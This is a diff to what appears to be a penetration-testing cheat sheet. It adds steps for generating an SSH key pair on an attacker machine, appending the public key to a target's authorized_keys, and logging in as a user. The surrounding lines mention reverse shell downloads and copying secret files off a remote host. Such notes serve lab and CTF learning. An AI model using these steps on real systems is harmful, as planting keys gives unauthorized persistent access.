@@ -170,6 +170,30 @@ __Download the reverse shell in windows__
 - `ssh admin@10.10.10.123`
 - Downloading a file from a remote system.
   - `scp user@10.10.10.10:/home/user/secret.zip .`
+### SSH Login from Attacker to Target using id_rsa
+```
+# Generate SSH Key Pair on Attacker Machine
+
+ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa # Give empty password
+
+
+# Copy Public Key from Attacker
+
+cat ~/.ssh/id_rsa.pub
+
+
+
+# Add Public Key to Target Machine
+
+cd ~/.ssh
+echo '<paste your public key here>' >> authorized_keys
+
+
+# From Attacker Machine
+
+ssh -i ~/.ssh/id_rsa athena@<target-ip>
+
+```
 
 #### Adding SSH Public key 
 - > This can be used to get ssh session, on target machine which is based on linux
